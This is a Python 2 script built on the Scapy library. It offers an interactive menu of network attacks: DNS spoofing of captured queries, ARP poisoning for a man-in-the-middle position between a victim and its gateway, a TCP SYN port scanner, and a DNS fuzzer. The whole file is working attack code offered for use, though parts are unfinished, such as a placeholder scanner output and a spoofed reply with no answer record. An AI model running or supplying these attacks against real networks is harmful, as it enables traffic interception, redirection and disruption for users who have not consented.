from scapy.all import *
import sys
import netifaces
import socket

#Core logic
if __name__ == "__main__":
    print "Interface Available"
    print netifaces.interfaces()
    netmask=[]
    for iface in netifaces.interfaces():
        try:
            netmask.append(iface+" : "+netifaces.ifaddresses(iface)[socket.AF_INET][0]['netmask'])
        except:
            pass
    print "Netmask For all corresponding interfaces"
    print netmask
    while 1:
        print "-------Menu------\n1.DNS Poisoning\n2.ARP MITM\n3.TCP SYN Scanner\n4.DNS Fuzzer\n5.Exit"
        num = int(raw_input(">>"))
        if num == 1:
            print "Capturing DNS Packets for DNS Poisoning"
            interface = raw_input("Enter the interface to use\n>>")
            server_ip = raw_input("Enter the Server IP to be spoofed\n>>")
            try:
                DNSPacket = sniff(iface=interface,filter="dst port 53",count=1)
    
                #If a DNS packet
                if DNSPacket[0].haslayer(DNS) and DNSPacket[0].getlayer(DNS).qr == 0 and DNSPacket[0].getlayer(DNS).qd.qtype == 1 and DNSPacket[0].getlayer(DNS).qd.qclass == 1 :  #qr code = 0 for Query and qr code = 1 for Response
                    print "\nGot DNS Query"

                    #Extract the src IP
                    src_ip = DNSPacket[0].getlayer(IP).src

                    #Extract UDP or TCP Src port
                    if DNSPacket[0].haslayer(UDP):
                        src_port = DNSPacket[0].getlayer(UDP).sport
                    elif DNSPacket[0].haslayer(TCP):
                        src_port = DNSPacket[0].getlayer(TCP).sport
                else:
                    pass

                clientDNSQueryID = DNSPacket[0].getlayer(DNS).id
                clientDNSServerDataCount = DNSPacket[0].getlayer(DNS).qdcount
                clientDNSServer = DNSPacket[0].getlayer(IP).dst
                clientDNSQuery = DNSPacket[0].getlayer(DNS).qd.qname

                print "Received Src IP:%s,\nReceived Src Port: %d \n Received Query ID:%d\nQuery Data Count:%d\nCurrent DNS Server:%s\nDNS Query:%s" %(src_ip,src_port,clientDNSQueryID,clientDNSServerDataCount,clientDNSServer,clientDNSQuery)

                spoofedDNSServerIP = server_ip
                spoofedIPPkt = IP(src = spoofedDNSServerIP,dst = src_ip)
                if DNSPacket[0].haslayer(TCP):
                    spoofedTCP_UDPPacket = TCP(sport = 53,dport = src_port)
                elif DNSPacket[0].haslayer(UDP):
                    spoofedTCP_UDPPacket = UDP(sport = 53,dport = src_port)

                spoofedDNSPacket = DNS(id = clientDNSQueryID,qr = DNSPacket[0].getlayer(DNS).qr,opcode = DNSPacket[0].getlayer(DNS).opcode,aa=DNSPacket[0].getlayer(DNS).aa,tc = DNSPacket[0].getlayer(DNS).tc,rd=DNSPacket[0].getlayer(DNS).rd,ra=DNSPacket[0].getlayer(DNS).ra,z=DNSPacket[0].getlayer(DNS).z,ad=DNSPacket[0].getlayer(DNS).ad,cd=DNSPacket[0].getlayer(DNS).cd,rcode=DNSPacket[0].getlayer(DNS).rcode,qdcount=DNSPacket[0].getlayer(DNS).qdcount,ancount=DNSPacket[0].getlayer(DNS).ancount,nscount=DNSPacket[0].getlayer(DNS).nscount,arcount=DNSPacket[0].getlayer(DNS).arcount,qd=DNSQR(qname=clientDNSQuery,qtype=DNSPacket[0].getlayer(DNS).qd.qtype,qclass=DNSPacket[0].getlayer(DNS).qd.qclass))

                print "Sending spoofed DNS packet"
                srp1(Ether()/spoofedIPPkt/spoofedTCP_UDPPacket/spoofedDNSPacket,timeout=1,verbose=0)
                print "Spoofed DNS Server: %s\nSrc port: %d\nDest port: %d" %(spoofedDNSServerIP,53,src_port)
            except KeyboardInterrupt:
                print "Exiting Script......"
                sys.exit()
        elif num == 2:
            try:
                print "Welcome to ARP MITM implementation"
                interface = raw_input("Enter the interface\n>>")
                mac_victim = raw_input("Enter the target MAC Address XX:XX:XX:XX:XX:XX\n>>")
                mac_gateway = raw_input("Enter the MAC address of Gateway\n>>")
                ip_gateway = raw_input("Enter the IP to be spoofed(Usually of the Gateway)\n>>")
                ip_victim = raw_input("Enter the IP of Victim\n>>")
                ARPPacket = sniff(iface=interface,filter="arp",count=1)
                Client_IP = ARPPacket[0].psrc
                Target_IP = ARPPacket[0].pdst
                print "ARP Packet has Client IP : %s and Gateway IP : %s" %(Client_IP,Target_IP)
                #Send packet to victim posing as gateway
                Arp_gateway = ARP(hwtype=ARPPacket[0].hwtype,ptype=ARPPacket[0].ptype,hwlen=ARPPacket[0].hwlen,plen=ARPPacket[0].plen,op=ARPPacket[0].op,hwsrc=mac_gateway,psrc=ip_gateway,hwdst=mac_victim,pdst=ip_victim)
                #Send packet to gateway posing as Victim
                Arp_victim = ARP(hwtype=ARPPacket[0].hwtype,ptype=ARPPacket[0].ptype,hwlen=ARPPacket[0].hwlen,plen=ARPPacket[0].plen,op=ARPPacket[0].op,hwsrc=mac_victim,psrc=ip_victim,hwdst=mac_gateway,pdst=ip_gateway)
                print "Build ARP Packet and now Spoofing ARP Packets"
                #We need to send as many packs as possible
                for i in range(100):
                    srp1(Ether()/Arp_gateway,timeout=1,verbose=0)
                    srp1(Ether()/Arp_victim,timeout=1,verbose=0)
            except KeyboardInterrupt:
                print "Exiting....."
                sys.exit()
        elif num == 3:
            try:
                #Observing errors while creating packets using scappy and need to be solved
                print "Welcome to TCP SYN Scanner"
                ip = raw_input("Enter the IP to scan :\n>>")
                ports = raw_input("Enter the port range to be scanned (eg: 0-65535)\n>>")
                lower_range = int(ports.split('-')[0])
                upper_range = int(ports.split('-')[1])
                for port in range(lower_range,upper_range+1):
                    tcpPacket = sr1(IP(dst=ip)/TCP(sport=12,dport=port,flags="S"),timeout=10,verbose=0)
                    if tcpPacket:
                        print "NNN"
            except KeyboardInterrupt:
                print "Exiting....."
                sys.exit()
        elif num == 4:
            print "Welcome to DNS Protocol Fuzzer"
            ip = raw_input("Enter the IP to fuzz\n>>")
            print "Fuzzer Statred! Watch over Wireshark"
            while True:
                try:
                    sr(IP(dst=ip)/UDP()/fuzz(DNS() ),inter=1,timeout=1,verbose=0)
                except KeyboardInterrupt:
                    break
            print "Fuzzing Over!!!"
        elif num == 5:
                print "Good Bye!..."
                sys.exit()
        else:
            print "Enter correct choice"
